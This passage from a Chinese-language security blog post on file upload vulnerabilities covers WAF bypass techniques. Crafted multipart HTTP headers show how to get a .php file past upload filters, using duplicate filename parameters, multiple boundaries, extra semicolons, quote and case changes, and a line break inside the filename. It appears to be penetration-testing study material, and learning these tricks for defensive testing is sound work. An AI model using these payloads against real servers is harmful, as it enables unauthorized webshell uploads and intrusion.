98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-f6d391582b1c2336.png" alt="图片.png"></li>
+<li>将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-a619261e549acadb.png" alt="图片.png"></li>
+<li>将垃圾数据加到Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</li>
+</ul>
+<h3 id="多个filename"><a href="#多个filename" class="headerlink" title="多个filename"></a>多个filename</h3><p>早期版本安全狗，可以多加一个filename</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</strong></p>
+<h3 id="交换name和filename的顺序"><a href="#交换name和filename的顺序" class="headerlink" title="交换name和filename的顺序"></a>交换name和filename的顺序</h3><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; filename=&quot;xx.php&quot;; name=file_x</span><br></pre></td></tr></table></figure>
+
+<h3 id="去掉引号-双引号变成单引号"><a href="#去掉引号-双引号变成单引号" class="headerlink" title="去掉引号,双引号变成单引号"></a>去掉引号,双引号变成单引号</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file_x&quot;</span>; filename=xx.php</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&#x27;file_x&#x27;</span>; filename=<span class="string">&#x27;xx.php&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>单引号、双引号、不要引号，都能上传。</p>
+<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><p>对这三个固定的字符串进行大小写转换</p>
+<ul>
+<li>Content-Disposition</li>
+<li>name</li>
+<li>filename</li>
+</ul>
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>在<code>: ; =</code>添加1个或者多个空格。</p>
+<h3 id="去掉或修改Content-Disposition值"><a href="#去掉或修改Content-Disposition值" class="headerlink" title="去掉或修改Content-Disposition值"></a>去掉或修改Content-Disposition值</h3><p>有的WAF在解析的时候，认为<code>Content-Disposition</code>值一定是<code>form-data</code>，造成绕过。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="多个boundary"><a href="#多个boundary" class="headerlink" title="多个boundary"></a>多个boundary</h3><p>最后上传的文件是<code>test.php</code>而非<code>test.txt</code>，但是取的文件名只取了第一个就会被Bypass。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/javascript</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;; filename=&quot;test.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/javascript</span><br></pre></td></tr></table></figure>
+
+<h3 id="多个分号"><a href="#多个分号" class="headerlink" title="多个分号"></a>多个分号</h3><p>文件解析时，可能解析不到文件名，导致绕过。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Header在boundary前添加任意字符"><a href="#Header在boundary前添加任意字符" class="headerlink" title="Header在boundary前添加任意字符"></a>Header在boundary前添加任意字符</h3><p>PHP支持，JAVA报错</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure>
+
+<h3 id="filename换行"><a href="#filename换行" class="headerlink" title="filename换行"></a>filename换行</h3><p>PHP支持，Java不支持。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file_x&quot;; file</span><br><span class="line">name=&quot;test.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="name和filename添加任意字符串"><a href="#name和filename添加任意字符串" class="headerlink" title="name和filename添加任意字符串"></a>name和filename添加任意字符串</h3><p>PHP支持，Java不支持。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>name=&quot;file_x&quot;; bypass waf upload; filename=&quot;test.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POST-GET"><a href="#POST-GET" class="headerlink" title="POST&#x2F;GET"></a>POST&#x2F;GET</h3><p><strong>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。</strong><br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2020/07/15/Marks/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-04-21 02:21:29
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Vulnerabilities/" title="Vulnerabilities">
+                        #Vulnerabilities
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2020/07/29/JMX-RMI-RCE/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-labs%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-text">upload-labs思维导图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%8C%85%E6%8F%8F%E8%BF%B0"><span class="toc-text">请求包描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A0%A1%E9%AA%8C%E5%A7%BF%E5%8A%BF"><span class="toc-text">文件上传校验姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E5%A4%A7%E6%A0%A1%E9%AA%8C%E7%AE%80%E8%BF%B0"><span class="toc-text">三大校验简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="toc-text">服务端校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#content-type%E5%AD%97%E6%AE%B5%E6%A0%A1%E9%AA%8C"><span class="toc-text">content-type字段校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%A1%E9%AA%8C"><span class="toc-text">文件头校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B"><span class="toc-text">文件内容检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E6%A3%80%E6%B5%8B"><span class="toc-text">文件加载检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%A0%A1%E9%AA%8C%E5%A7%BF%E5%8A%BF"><span class="toc-text">文件上传绕过校验姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="toc-text">客户端绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="toc-text">服务端绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="toc-text">文件类型绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="toc-text">文件头绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-text">文件后缀名绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">配合文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-text">配合服务器解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E8%A7%84%E5%88%99"><span class="toc-text">配合操作系统文件命令规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CMS%E3%80%81%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">CMS、编辑器漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fckeditor"><span class="toc-text">fckeditor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ewededtior"><span class="toc-text">ewededtior</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">其他类型编辑器漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E5%90%880x00%E6%88%AA%E6%96%AD"><span class="toc-text">配合0x00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF-Bypass"><span class="toc-text">WAF Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E5%A6%82%E4%BD%95%E6%8B%A6%E6%88%AA"><span class="toc-text">WAF如何拦截</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="toc-text">垃圾数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AAfilename"><span class="toc-text">多个filename</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E6%8D%A2name%E5%92%8Cfilename%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="toc-text">交换name和filename的顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%BB%E6%8E%89%E5%BC%95%E5%8F%B7-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%98%E6%88%90%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-text">去掉引号,双引号变成单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-text">大小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-text">空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%BB%E6%8E%89%E6%88%96%E4%BF%AE%E6%94%B9Content-Disposition%E5%80%BC"><span class="toc-text">去掉或修改Content-Disposition值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AAboundary"><span class="toc-text">多个boundary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AA%E5%88%86%E5%8F%B7"><span class="toc-text">多个分号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Header%E5%9C%A8boundary%E5%89%8D%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6"><span class="toc-text">Header在boundary前添加任意字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filename%E6%8D%A2%E8%A1%8C"><span class="toc-text">filename换行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#name%E5%92%8Cfilename%E6%B7%BB%E5%8A%A0%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">name和filename添加任意字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-GET"><span class="toc-text">POST&#x2F;GET</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/L0kiii">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2024
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + File%20Upload%20Vulnerabilities + '&url=' + https%3A%2F%2Fl0ki.net%2F2020%2F07%2F16%2FFile-Upload-Vulnerabilities%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://l0ki.net/2020/07/16/File-Upload-Vulnerabilities/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+</html>
